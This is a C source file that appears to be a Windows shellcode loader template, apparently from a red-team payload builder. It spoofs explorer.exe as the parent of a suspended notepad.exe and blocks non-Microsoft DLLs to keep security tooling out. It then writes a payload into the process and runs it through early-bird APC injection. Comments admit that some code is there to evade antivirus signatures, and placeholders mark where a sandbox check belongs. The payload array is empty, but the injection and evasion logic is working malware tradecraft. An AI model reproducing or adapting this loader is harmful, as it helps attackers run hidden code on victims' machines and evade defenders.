#define _WIN32_WINNT 0x0600
#include <windows.h>
#include <stdint.h>
#include <psapi.h>
#include <winternl.h>
#include <tlhelp32.h>

//unsigned char payload[] = {};
unsigned char payload[] = {};
unsigned int payload_len = sizeof(payload);

unsigned char* decoded;

#define PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY 0x20007
#define PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON 0x100000000000

// REPLACE_SANDBOX_CHECK

// LAZY did have xor encoding but didn't feel like messing with it again.

int deC(unsigned char payload[])
{
    for (int i = 0; i < payload_len; i++)
    {
        decoded[i] = payload[i];
    }
    return 0;
}

HANDLE GetParentHandle(LPCSTR parent)
{
    HANDLE hProcess = NULL;
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (Process32First(snapshot, &entry) == TRUE)
    {
        while (Process32Next(snapshot, &entry) == TRUE)
        {
            if (stricmp(entry.szExeFile, parent) == 0)
            {
                CLIENT_ID cID;
                cID.UniqueThread = 0;
                cID.UniqueProcess = UlongToHandle(entry.th32ProcessID);

                OBJECT_ATTRIBUTES oa;
                InitializeObjectAttributes(&oa, 0, 0, 0, 0);

                hProcess = OpenProcess(PROCESS_ALL_ACCESS, &oa, entry.th32ProcessID);

                if (hProcess != NULL && hProcess != INVALID_HANDLE_VALUE)
                {
                    CloseHandle(snapshot);
                    return hProcess;
                }
                else
                {
                    CloseHandle(snapshot);
                    return INVALID_HANDLE_VALUE;
                }
            }
        }
    }
    CloseHandle(snapshot);
    return INVALID_HANDLE_VALUE;
}

PROCESS_INFORMATION SpawnProc(LPSTR process, HANDLE hParent) {
    STARTUPINFOEXA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    SIZE_T attributeSize;

    InitializeProcThreadAttributeList(NULL, 2, 0, &attributeSize);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
    InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, &attributeSize);
    
    DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(DWORD64), NULL, NULL);
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL);
    
    si.StartupInfo.cb = sizeof(si);
    si.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT;

    if (!CreateProcessA(NULL, process, NULL, NULL, TRUE, CREATE_SUSPENDED | DETACHED_PROCESS | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi)) {
    }

    DeleteProcThreadAttributeList(si.lpAttributeList);
    return pi;
}

int main()
{
    DWORD oldprotect = 0;
    PVOID base_addr = NULL;
    SIZE_T bytesWritten;

//    REPLACE_ME_SANDBOX_CALL
    printf("Size of Payload (0x%08X)\n", payload_len);
    decoded = (unsigned char*)malloc(payload_len);
    deC(payload);

    //next few lines do nothing... but they help evade some AV signatures
    NTSTATUS res = -1;
    if (res == 0) {
        printf("Doing nothing!");
    }

    HANDLE hParent = GetParentHandle("explorer.exe");
    if (hParent == INVALID_HANDLE_VALUE)
        return 0;

    PROCESS_INFORMATION pi = SpawnProc((LPSTR)"notepad.exe", hParent);
    if (pi.hProcess == INVALID_HANDLE_VALUE || pi.hThread == INVALID_HANDLE_VALUE)
        return 0;
    
    HANDLE hProcess = pi.hProcess;
    HANDLE hThread = pi.hThread;

    base_addr = VirtualAllocEx(hProcess, base_addr, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (base_addr == 0){
        printf(  "VirtualAlloc FAILED to allocate memory in created process, exiting: \n",  res );
        return 0;
    }
    else {
        printf(  "VirtualAlloc allocated memory in the created process sucessfully.\n");
    }

    res = WriteProcessMemory(hProcess, base_addr, decoded, payload_len, &bytesWritten);
    if (res == 0){
        printf( "NtWriteVirtualMemory FAILED to write decoded payload to entrypointAddress: %x\n",  res );
        return 0;
    }
    else{
        printf( "NtWriteVirtualMemory wrote decoded payload to entrypointAddress successfully.\n" );
    }

    res = VirtualProtectEx(hProcess,  base_addr, payload_len, PAGE_EXECUTE_READ, &oldprotect);

    if (res == 0){
        printf(  "VirtualProtectEx FAILED to modify permissions: \n",  res );
        return 0;
    }
    else{
        printf(  "VirtualProtectEx modified permissions successfully.\n");
    }

    res = QueueUserAPC((PAPCFUNC)base_addr, hThread, NULL);

    if (res == 0){
        printf(  "QueueUserApc FAILED to add routine to APC queue: \n",  res );
        return 0;
    }
    else{
        printf(  "QueueUserApc added routine to APC queue successfully.\n");
    }

    res = ResumeThread(hThread );

    if (res == -1){
        printf(  "ResumeThread FAILED to resume thread: \n",  res );
        return 0;
    }
    else{
        printf(  "ResumeThread resumed thread successfully.\n");
    }

    CloseHandle(hProcess);
    CloseHandle(hThread);
}
